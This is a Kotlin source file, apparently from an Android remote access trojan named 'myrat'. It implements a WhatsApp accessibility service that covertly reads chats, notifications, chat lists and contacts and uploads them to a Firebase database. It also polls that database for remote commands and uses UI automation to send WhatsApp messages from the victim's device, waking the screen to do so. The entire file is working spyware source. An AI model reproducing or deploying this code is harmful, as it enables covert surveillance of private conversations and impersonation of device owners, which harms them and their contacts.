package com.myrat.app.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.app.KeyguardManager
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import androidx.core.app.NotificationCompat
import com.google.firebase.database.*
import com.myrat.app.MainActivity
import com.myrat.app.R
import com.myrat.app.utils.Logger
import kotlinx.coroutines.*
import java.security.MessageDigest
import java.util.concurrent.ConcurrentHashMap

class WhatsAppService : AccessibilityService() {

    private val db = FirebaseDatabase.getInstance().reference
    private lateinit var deviceId: String
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val messageCache = ConcurrentHashMap<String, Long>()
    private val contactCache = ConcurrentHashMap<String, Boolean>()
    private val valueEventListener = ConcurrentHashMap<String, ValueEventListener>()
    private val CACHE_DURATION = 24 * 60 * 60 * 1000L // 24 hours
    private val NOTIFICATION_ID = 12
    private val CHANNEL_ID = "WhatsAppService"
    private var wakeLock: PowerManager.WakeLock? = null
    private var screenWakeLock: PowerManager.WakeLock? = null
    private val handler = Handler(Looper.getMainLooper())
    private var lastNotificationTime = 0L
    private val pendingCommands = mutableListOf<SendCommand>()
    private var isProcessingCommand = false

    companion object {
        const val WHATSAPP_PACKAGE = "com.whatsapp"
        const val WHATSAPP_BUSINESS_PACKAGE = "com.whatsapp.w4b"

        // Enhanced view IDs for better compatibility across WhatsApp versions
        private val MESSAGE_TEXT_IDS = listOf(
            "message_text", "text_message", "message_body", "chat_message_text", "message_content"
        )
        private val CONVERSATION_LAYOUT_IDS = listOf(
            "conversation_layout", "chat_layout", "conversation_container", "chat_container"
        )
        private val CONVERSATIONS_ROW_IDS = listOf(
            "conversations_row", "chat_row", "conversation_item", "chat_item"
        )
        private val DATE_IDS = listOf(
            "date", "time", "timestamp", "message_time", "message_timestamp"
        )
        private val OUTGOING_MSG_INDICATOR_IDS = listOf(
            "outgoing_msg_indicator", "sent_indicator", "message_status", "status_icon"
        )
        private val CONTACT_NAME_IDS = listOf(
            "conversation_contact_name", "contact_name", "chat_title", "header_title", "toolbar_title"
        )
        private val SEARCH_IDS = listOf(
            "menuitem_search", "search", "search_button", "action_search"
        )
        private val SEARCH_INPUT_IDS = listOf(
            "search_input", "search_field", "search_edit_text", "search_src_text"
        )
        private val MESSAGE_ENTRY_IDS = listOf(
            "entry", "message_entry", "input_message", "chat_input", "compose_text"
        )
        private val SEND_IDS = listOf(
            "send", "send_button", "btn_send", "voice_note_btn"
        )
    }

    data class SendCommand(
        val number: String,
        val message: String,
        val packageName: String,
        val timestamp: Long = System.currentTimeMillis(),
        val retryCount: Int = 0
    )

    override fun onCreate() {
        super.onCreate()
        try {
            acquireWakeLocks()
            deviceId = MainActivity.getDeviceId(this)
            Logger.log("WhatsAppService started for deviceId: $deviceId")
            startForegroundService()
            setupAccessibilityService()
            loadKnownContacts()
            scheduleCacheCleanup()
            listenForSendMessageCommands()
            setupNotificationMonitoring()
            setupCommandProcessor()
        } catch (e: Exception) {
            Logger.error("Failed to create WhatsAppService", e)
        }
    }

    private fun acquireWakeLocks() {
        try {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager

            // Partial wake lock to keep CPU running
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "WhatsAppService:KeepAlive"
            )
            wakeLock?.acquire(60 * 60 * 1000L) // 1 hour

            // Screen wake lock for when we need to interact with UI
            screenWakeLock = powerManager.newWakeLock(
                PowerManager.FULL_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP or PowerManager.ON_AFTER_RELEASE,
                "WhatsAppService:ScreenWake"
            )

            Logger.log("Wake locks acquired for WhatsAppService")
        } catch (e: Exception) {
            Logger.error("Failed to acquire wake locks for WhatsApp", e)
        }
    }

    private fun startForegroundService() {
        try {
            val channelName = "WhatsApp Monitoring Service"
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val channel = NotificationChannel(
                    CHANNEL_ID, channelName, NotificationManager.IMPORTANCE_LOW
                ).apply {
                    setShowBadge(false)
                    enableLights(false)
                    enableVibration(false)
                    setSound(null, null)
                }
                (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
                    .createNotificationChannel(channel)
            }

            val notification = NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("WhatsApp Monitor")
                .setContentText("Monitoring WhatsApp messages and commands")
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setSilent(true)
                .setShowWhen(false)
                .setOngoing(true)
                .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
                .build()

            startForeground(NOTIFICATION_ID, notification)
        } catch (e: Exception) {
            Logger.error("Failed to start WhatsApp foreground service", e)
        }
    }

    private fun setupAccessibilityService() {
        try {
            val info = AccessibilityServiceInfo().apply {
                // Enhanced event types for comprehensive message capture
                eventTypes = AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
                        AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                        AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                        AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED or
                        AccessibilityEvent.TYPE_VIEW_CLICKED or
                        AccessibilityEvent.TYPE_VIEW_FOCUSED or
                        AccessibilityEvent.TYPE_VIEW_SELECTED

                feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
                flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                        AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                        AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or
                        AccessibilityServiceInfo.FLAG_REQUEST_ENHANCED_WEB_ACCESSIBILITY

                packageNames = arrayOf(WHATSAPP_PACKAGE, WHATSAPP_BUSINESS_PACKAGE)

                // Minimal timeout for faster response
                notificationTimeout = 50
            }
            serviceInfo = info
            Logger.log("Accessibility service configured for comprehensive monitoring")
        } catch (e: Exception) {
            Logger.error("Failed to setup accessibility service", e)
        }
    }

    private fun setupNotificationMonitoring() {
        scope.launch {
            while (isActive) {
                try {
                    delay(2000) // Check every 2 seconds

                    // Process any pending send commands
                    if (!isProcessingCommand && pendingCommands.isNotEmpty()) {
                        processNextCommand()
                    }

                } catch (e: Exception) {
                    Logger.error("Error in notification monitoring", e)
                }
            }
        }
    }

    private fun setupCommandProcessor() {
        scope.launch {
            while (isActive) {
                try {
                    delay(1000) // Check every second for commands

                    if (!isProcessingCommand && pendingCommands.isNotEmpty()) {
                        processNextCommand()
                    }

                } catch (e: Exception) {
                    Logger.error("Error in command processor", e)
                }
            }
        }
    }

    private suspend fun processNextCommand() {
        if (isProcessingCommand || pendingCommands.isEmpty()) return

        isProcessingCommand = true
        try {
            val command = pendingCommands.removeAt(0)
            Logger.log("Processing WhatsApp command: ${command.number} - ${command.message}")

            // Wake up screen if needed for UI interaction
            wakeUpScreen()

            sendWhatsAppMessage(command.number, command.message, command.packageName)

            delay(2000) // Wait between commands
        } catch (e: Exception) {
            Logger.error("Error processing command", e)
        } finally {
            isProcessingCommand = false
        }
    }

    private fun wakeUpScreen() {
        try {
            val keyguardManager = getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager

            // Check if screen is off or device is locked
            if (!powerManager.isInteractive || keyguardManager.isKeyguardLocked) {
                Logger.log("Waking up screen for WhatsApp interaction")

                screenWakeLock?.let { wakeLock ->
                    if (!wakeLock.isHeld) {
                        wakeLock.acquire(30000) // 30 seconds
                        Logger.log("Screen wake lock acquired")
                    }
                }

                // Additional wake up methods for different Android versions
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
                    // For newer Android versions
                    try {
                        val intent = Intent(Intent.ACTION_MAIN).apply {
                            addCategory(Intent.CATEGORY_HOME)
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        }
                        startActivity(intent)
                    } catch (e: Exception) {
                        Logger.error("Failed to wake screen with intent", e)
                    }
                }
            }
        } catch (e: Exception) {
            Logger.error("Error waking up screen", e)
        }
    }

    private fun scheduleCacheCleanup() {
        scope.launch {
            try {
                while (isActive) {
                    delay(60_000)
                    val now = System.currentTimeMillis()
                    val removedEntries = messageCache.entries.filter { now - it.value > CACHE_DURATION }
                    removedEntries.forEach { messageCache.remove(it.key) }
                    if (removedEntries.isNotEmpty()) {
                        Logger.log("Cache cleaned, removed ${removedEntries.size} entries, size: ${messageCache.size}")
                    }
                }
            } catch (e: Exception) {
                Logger.error("Error in cache cleanup", e)
            }
        }
    }

    private fun loadKnownContacts() {
        try {
            db.child("Device").child(deviceId).child("whatsapp/contacts")
                .get().addOnSuccessListener { snapshot ->
                    snapshot.children.forEach { contact ->
                        contactCache[contact.key!!] = true
                    }
                    Logger.log("Loaded ${contactCache.size} known contacts")
                }.addOnFailureListener { e ->
                    Logger.log("Failed to load contacts: ${e.message}")
                }
        } catch (e: Exception) {
            Logger.error("Error loading known contacts", e)
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return

        // Only process WhatsApp events
        if (event.packageName != WHATSAPP_PACKAGE && event.packageName != WHATSAPP_BUSINESS_PACKAGE) return

        scope.launch {
            try {
                when (event.eventType) {
                    AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED,
                    AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                        handleContentChange(event)
                    }
                    AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                        handleWindowStateChange(event)
                    }
                    AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
                        handleNotificationChange(event)
                    }
                }
            } catch (e: Exception) {
                Logger.error("Error processing accessibility event: ${e.message}", e)
            }
        }
    }

    private fun handleNotificationChange(event: AccessibilityEvent) {
        try {
            // Extract message from notification
            val notificationText = event.text?.joinToString(" ") ?: return
            if (notificationText.isBlank()) return

            val packageName = event.packageName.toString()
            val timestamp = System.currentTimeMillis()

            // Parse notification for sender and message
            val parts = notificationText.split(":", limit = 2)
            if (parts.size >= 2) {
                val sender = parts[0].trim()
                val message = parts[1].trim()

                if (sender.isNotEmpty() && message.isNotEmpty()) {
                    val messageId = generateMessageId(sender, message, timestamp, packageName, "Received")

                    if (!messageCache.containsKey(messageId)) {
                        messageCache[messageId] = timestamp

                        val isNewContact = !contactCache.containsKey(sender)
                        if (isNewContact) {
                            contactCache[sender] = true
                        }

                        val messageData = mapOf(
                            "sender" to sender,
                            "recipient" to "You",
                            "content" to message,
                            "timestamp" to timestamp,
                            "type" to "Received",
                            "isNewContact" to isNewContact,
                            "uploaded" to System.currentTimeMillis(),
                            "messageId" to messageId,
                            "packageName" to packageName,
                            "direction" to "Received",
                            "source" to "notification"
                        )

                        Logger.log("New message from notification: $sender -> $message")
                        uploadMessage(messageData)
                    }
                }
            }
        } catch (e: Exception) {
            Logger.error("Error handling notification change", e)
        }
    }

    private fun handleContentChange(event: AccessibilityEvent) {
        try {
            val rootNode = rootInActiveWindow ?: return
            val packageName = event.packageName.toString()

            // Check if we're in a chat screen
            if (isChatScreen(rootNode, packageName)) {
                val messageNodes = findMessageNodes(rootNode, packageName)
                messageNodes.forEach { node ->
                    extractAndUploadMessage(node, packageName)
                }
                extractChatMetadata(rootNode, packageName)
            }
        } catch (e: Exception) {
            Logger.error("Error handling content change", e)
        }
    }

    private fun handleWindowStateChange(event: AccessibilityEvent) {
        try {
            val rootNode = rootInActiveWindow ?: return
            val packageName = event.packageName.toString()

            if (isChatListScreen(rootNode, packageName)) {
                extractChatListData(rootNode, packageName)
            } else if (isChatScreen(rootNode, packageName)) {
                extractChatMetadata(rootNode, packageName)
            }
        } catch (e: Exception) {
            Logger.error("Error handling window state change", e)
        }
    }

    private fun isChatScreen(rootNode: AccessibilityNodeInfo, packageName: String): Boolean {
        return try {
            CONVERSATION_LAYOUT_IDS.any { id ->
                rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").isNotEmpty()
            }
        } catch (e: Exception) {
            Logger.error("Error checking if chat screen", e)
            false
        }
    }

    private fun isChatListScreen(rootNode: AccessibilityNodeInfo, packageName: String): Boolean {
        return try {
            CONVERSATIONS_ROW_IDS.any { id ->
                rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").isNotEmpty()
            }
        } catch (e: Exception) {
            Logger.error("Error checking if chat list screen", e)
            false
        }
    }

    private fun findMessageNodes(rootNode: AccessibilityNodeInfo, packageName: String): List<AccessibilityNodeInfo> {
        return try {
            MESSAGE_TEXT_IDS.flatMap { id ->
                rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id")
            }
        } catch (e: Exception) {
            Logger.error("Error finding message nodes", e)
            emptyList()
        }
    }

    private fun extractAndUploadMessage(node: AccessibilityNodeInfo, packageName: String) {
        try {
            val messageText = node.text?.toString() ?: return
            if (messageText.isBlank()) return

            val parent = node.parent ?: return
            val timestamp = getTimestampFromNode(parent, packageName) ?: System.currentTimeMillis()

            val direction = if (isOutgoingMessage(parent, packageName)) "Sent" else "Received"
            val chatName = getCurrentChatName(packageName) ?: "Unknown"

            val isNewContact = !contactCache.containsKey(chatName) && direction == "Received"
            if (isNewContact) {
                contactCache[chatName] = true
                db.child("Device").child(deviceId).child("whatsapp/contacts").child(chatName)
                    .setValue(mapOf(
                        "dpUrl" to getContactDp(chatName, packageName),
                        "firstSeen" to System.currentTimeMillis()
                    ))
            }

            val messageId = generateMessageId(chatName, messageText, timestamp, packageName, direction)
            if (messageCache.containsKey(messageId)) {
                return // Duplicate message
            }
            messageCache[messageId] = timestamp

            val messageData = mapOf(
                "sender" to (if (direction == "Sent") "You" else chatName),
                "recipient" to (if (direction == "Sent") chatName else "You"),
                "content" to messageText,
                "timestamp" to timestamp,
                "type" to if (isReplyMessage(parent, packageName)) "Reply" else direction,
                "isNewContact" to isNewContact,
                "uploaded" to System.currentTimeMillis(),
                "messageId" to messageId,
                "packageName" to packageName,
                "direction" to direction,
                "source" to "accessibility"
            )

            Logger.log("New message: ${messageData["type"]} from ${messageData["sender"]} ($packageName)")
            uploadMessage(messageData)
        } catch (e: Exception) {
            Logger.error("Error extracting and uploading message", e)
        }
    }

    private fun getTimestampFromNode(parent: AccessibilityNodeInfo, packageName: String): Long? {
        return try {
            DATE_IDS.forEach { id ->
                val timestampNode = parent.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()
                if (timestampNode != null) {
                    return parseTimestamp(timestampNode.text?.toString())
                }
            }
            null
        } catch (e: Exception) {
            null
        }
    }

    private fun isOutgoingMessage(parent: AccessibilityNodeInfo, packageName: String): Boolean {
        return try {
            OUTGOING_MSG_INDICATOR_IDS.any { id ->
                parent.findAccessibilityNodeInfosByViewId("$packageName:id/$id").isNotEmpty()
            }
        } catch (e: Exception) {
            false
        }
    }

    private fun generateMessageId(sender: String, text: String, timestamp: Long, packageName: String, direction: String): String {
        return try {
            val input = "$sender$text$timestamp$packageName$direction${System.nanoTime()}"
            MessageDigest.getInstance("SHA-256")
                .digest(input.toByteArray())
                .joinToString("") { "%02x".format(it) }
                .substring(0, 32)
        } catch (e: Exception) {
            Logger.error("Error generating message ID", e)
            "error_${System.currentTimeMillis()}_${(1000..9999).random()}"
        }
    }

    private fun parseTimestamp(timestampStr: String?): Long {
        return try {
            timestampStr?.let {
                when {
                    it.contains(":") -> System.currentTimeMillis()
                    it.matches(Regex("\\d+")) -> it.toLongOrNull() ?: System.currentTimeMillis()
                    else -> System.currentTimeMillis()
                }
            } ?: System.currentTimeMillis()
        } catch (e: Exception) {
            System.currentTimeMillis()
        }
    }

    private fun isReplyMessage(parent: AccessibilityNodeInfo, packageName: String): Boolean {
        return try {
            parent.findAccessibilityNodeInfosByViewId("$packageName:id/quoted_message").isNotEmpty()
        } catch (e: Exception) {
            false
        }
    }

    private fun getCurrentChatName(packageName: String): String? {
        return try {
            val rootNode = rootInActiveWindow ?: return null
            CONTACT_NAME_IDS.forEach { id ->
                val titleNode = rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()
                if (titleNode != null) {
                    return titleNode.text?.toString()
                }
            }
            null
        } catch (e: Exception) {
            Logger.error("Error getting current chat name", e)
            null
        }
    }

    private fun getContactDp(contactName: String, packageName: String): String {
        Logger.log("DP access for $contactName ($packageName) - placeholder implementation")
        return ""
    }

    private fun uploadMessage(message: Map<String, Any>) {
        scope.launch {
            try {
                val messagesRef = db.child("Device").child(deviceId).child("whatsapp/data")
                messagesRef.child(message["messageId"] as String).setValue(message)
                    .addOnSuccessListener {
                        Logger.log("Message uploaded: ${message["content"]} (${message["packageName"]})")
                    }
                    .addOnFailureListener { e ->
                        Logger.error("Message upload failed: ${e.message}", e)
                    }
            } catch (e: Exception) {
                Logger.error("Error uploading message", e)
            }
        }
    }

    private fun extractChatListData(rootNode: AccessibilityNodeInfo, packageName: String) {
        try {
            val chatNodes = CONVERSATIONS_ROW_IDS.flatMap { id ->
                rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id")
            }
            val chats = mutableListOf<Map<String, Any>>()

            chatNodes.forEach { chatNode ->
                val name = CONTACT_NAME_IDS.mapNotNull { id ->
                    chatNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()?.text?.toString()
                }.firstOrNull() ?: ""

                val lastMessage = chatNode.findAccessibilityNodeInfosByViewId("$packageName:id/conversation_last_message")
                    .firstOrNull()?.text?.toString() ?: ""

                val timestamp = DATE_IDS.mapNotNull { id ->
                    chatNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()?.text?.toString()
                }.firstOrNull()?.let { parseTimestamp(it) } ?: 0L

                val unreadCount = chatNode.findAccessibilityNodeInfosByViewId("$packageName:id/unread_count")
                    .firstOrNull()?.text?.toString()?.toIntOrNull() ?: 0

                if (name.isNotEmpty()) {
                    chats.add(mapOf(
                        "name" to name,
                        "lastMessage" to lastMessage,
                        "timestamp" to timestamp,
                        "unreadCount" to unreadCount,
                        "packageName" to packageName
                    ))
                }
            }

            if (chats.isNotEmpty()) {
                db.child("Device").child(deviceId).child("whatsapp/chats").setValue(chats)
                    .addOnSuccessListener {
                        Logger.log("Chat list uploaded: ${chats.size} chats ($packageName)")
                    }
                    .addOnFailureListener { e ->
                        Logger.error("Failed to upload chat list ($packageName): ${e.message}", e)
                    }
            }
        } catch (e: Exception) {
            Logger.error("Error extracting chat list data", e)
        }
    }

    private fun extractChatMetadata(rootNode: AccessibilityNodeInfo, packageName: String) {
        try {
            val chatName = getCurrentChatName(packageName) ?: return
            val dpUrl = getContactDp(chatName, packageName)
            if (dpUrl.isNotEmpty()) {
                db.child("Device").child(deviceId).child("whatsapp/contacts").child(chatName)
                    .setValue(mapOf("dpUrl" to dpUrl))
            }
        } catch (e: Exception) {
            Logger.error("Error extracting chat metadata", e)
        }
    }

    private fun listenForSendMessageCommands() {
        try {
            val sendRef = db.child("Device").child(deviceId).child("whatsapp/commands")
            val listener = object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    try {
                        snapshot.children.forEach { command ->
                            val number = command.child("number").getValue(String::class.java) ?: return@forEach
                            val message = command.child("message").getValue(String::class.java) ?: return@forEach
                            val packageName = command.child("packageName").getValue(String::class.java) ?: WHATSAPP_PACKAGE

                            Logger.log("Received send command for $number: $message ($packageName)")

                            // Add to pending commands for processing
                            pendingCommands.add(SendCommand(number, message, packageName))

                            // Remove the command from database
                            command.ref.removeValue()
                        }
                    } catch (e: Exception) {
                        Logger.error("Error processing send commands", e)
                    }
                }

                override fun onCancelled(error: DatabaseError) {
                    Logger.error("Failed to read send command: ${error.message}")
                }
            }
            valueEventListener["sendCommands"] = listener
            sendRef.addValueEventListener(listener)
        } catch (e: Exception) {
            Logger.error("Error setting up send message commands listener", e)
        }
    }

    private suspend fun sendWhatsAppMessage(recipient: String, message: String, packageName: String) {
        try {
            Logger.log("🚀 Starting to send message to $recipient via $packageName")

            // Ensure screen is awake for UI interaction
            wakeUpScreen()
            delay(1000)

            // Open WhatsApp or WhatsApp Business
            val intent = packageManager.getLaunchIntentForPackage(packageName)?.apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP)
            } ?: run {
                Logger.error("$packageName not installed")
                return
            }

            startActivity(intent)
            delay(4000) // Wait for app to load

            // Step 1: Find and click search (with retries)
            var success = false
            for (searchAttempt in 1..5) {
                val rootNode = rootInActiveWindow
                if (rootNode != null) {
                    val searchButton = SEARCH_IDS.mapNotNull { id ->
                        rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()
                    }.firstOrNull()

                    if (searchButton != null) {
                        searchButton.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        Logger.log("✅ Search button clicked (attempt $searchAttempt)")
                        success = true
                        break
                    }
                }
                delay(1500)
            }

            if (!success) {
                Logger.error("❌ Search button not found after 5 attempts ($packageName)")
                return
            }

            delay(2000)

            // Step 2: Enter recipient in search field (with retries)
            success = false
            for (searchFieldAttempt in 1..5) {
                val rootNode = rootInActiveWindow
                if (rootNode != null) {
                    val searchField = SEARCH_INPUT_IDS.mapNotNull { id ->
                        rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()
                    }.firstOrNull()

                    if (searchField != null) {
                        // Clear existing text first
                        searchField.performAction(AccessibilityNodeInfo.ACTION_FOCUS)
                        delay(500)

                        // Select all text and replace
                        val selectAllArgs = Bundle().apply {
                            putInt(AccessibilityNodeInfo.ACTION_ARGUMENT_SELECTION_START_INT, 0)
                            putInt(AccessibilityNodeInfo.ACTION_ARGUMENT_SELECTION_END_INT, searchField.text?.length ?: 0)
                        }
                        searchField.performAction(AccessibilityNodeInfo.ACTION_SET_SELECTION, selectAllArgs)
                        delay(300)

                        // Set new text
                        val args = Bundle().apply {
                            putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, recipient)
                        }
                        searchField.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
                        Logger.log("✅ Search field filled with recipient (attempt $searchFieldAttempt)")
                        success = true
                        break
                    }
                }
                delay(1500)
            }

            if (!success) {
                Logger.error("❌ Search field not found after 5 attempts ($packageName)")
                return
            }

            delay(3000)

            // Step 3: Click on the contact result (with retries)
            success = false
            for (contactAttempt in 1..5) {
                val rootNode = rootInActiveWindow
                if (rootNode != null) {
                    // Look for contact results or conversation rows
                    val contactResult = CONTACT_NAME_IDS.mapNotNull { id ->
                        rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()
                    }.firstOrNull() ?: CONVERSATIONS_ROW_IDS.mapNotNull { id ->
                        rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()
                    }.firstOrNull()

                    if (contactResult != null) {
                        contactResult.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        Logger.log("✅ Contact result clicked (attempt $contactAttempt)")
                        success = true
                        break
                    }
                }
                delay(1500)
            }

            if (!success) {
                Logger.error("❌ Contact result not found for $recipient after 5 attempts ($packageName)")
                return
            }

            delay(3000)

            // Step 4: Enter message in input field (with retries)
            success = false
            for (messageAttempt in 1..5) {
                val rootNode = rootInActiveWindow
                if (rootNode != null) {
                    val messageInput = MESSAGE_ENTRY_IDS.mapNotNull { id ->
                        rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()
                    }.firstOrNull()

                    if (messageInput != null) {
                        // Focus on input field
                        messageInput.performAction(AccessibilityNodeInfo.ACTION_FOCUS)
                        delay(500)

                        // Clear existing text
                        val selectAllArgs = Bundle().apply {
                            putInt(AccessibilityNodeInfo.ACTION_ARGUMENT_SELECTION_START_INT, 0)
                            putInt(AccessibilityNodeInfo.ACTION_ARGUMENT_SELECTION_END_INT, messageInput.text?.length ?: 0)
                        }
                        messageInput.performAction(AccessibilityNodeInfo.ACTION_SET_SELECTION, selectAllArgs)
                        delay(300)

                        // Set message text
                        val messageArgs = Bundle().apply {
                            putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, message)
                        }
                        messageInput.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, messageArgs)
                        Logger.log("✅ Message input filled (attempt $messageAttempt)")
                        success = true
                        break
                    }
                }
                delay(1500)
            }

            if (!success) {
                Logger.error("❌ Message input not found after 5 attempts ($packageName)")
                return
            }

            delay(2000)

            // Step 5: Click send button (with retries)
            success = false
            for (sendAttempt in 1..5) {
                val rootNode = rootInActiveWindow
                if (rootNode != null) {
                    val sendButton = SEND_IDS.mapNotNull { id ->
                        rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()
                    }.firstOrNull()

                    if (sendButton != null) {
                        sendButton.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        Logger.log("✅ Send button clicked (attempt $sendAttempt)")
                        success = true
                        break
                    }
                }
                delay(1500)
            }

            if (success) {
                Logger.log("🎉 Successfully sent message to $recipient ($packageName)")

                // Log sent message with unique ID to prevent duplicates
                val messageData = mapOf(
                    "sender" to "You",
                    "recipient" to recipient,
                    "content" to message,
                    "timestamp" to System.currentTimeMillis(),
                    "type" to "Sent",
                    "isNewContact" to !contactCache.containsKey(recipient),
                    "uploaded" to System.currentTimeMillis(),
                    "messageId" to generateMessageId("You", message, System.currentTimeMillis(), packageName, "Sent"),
                    "packageName" to packageName,
                    "direction" to "Sent",
                    "source" to "command"
                )
                uploadMessage(messageData)
            } else {
                Logger.error("❌ Send button not found after 5 attempts ($packageName)")
            }

            // Release screen wake lock after sending
            screenWakeLock?.let { wakeLock ->
                if (wakeLock.isHeld) {
                    wakeLock.release()
                    Logger.log("Screen wake lock released after sending")
                }
            }

        } catch (e: Exception) {
            Logger.error("Error sending message ($packageName): ${e.message}", e)

            // Release screen wake lock on error
            screenWakeLock?.let { wakeLock ->
                if (wakeLock.isHeld) {
                    wakeLock.release()
                }
            }
        }
    }

    override fun onInterrupt() {
        Logger.log("WhatsAppService interrupted")
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            // Release wake locks
            wakeLock?.let {
                if (it.isHeld) {
                    it.release()
                }
            }
            screenWakeLock?.let {
                if (it.isHeld) {
                    it.release()
                }
            }

            scope.cancel()
            valueEventListener.forEach { (_, listener) ->
                db.child("Device").child(deviceId).child("whatsapp/commands")
                    .removeEventListener(listener)
            }
            valueEventListener.clear()
            Logger.log("WhatsAppService destroyed")
        } catch (e: Exception) {
            Logger.error("Error destroying WhatsAppService", e)
        }
    }
}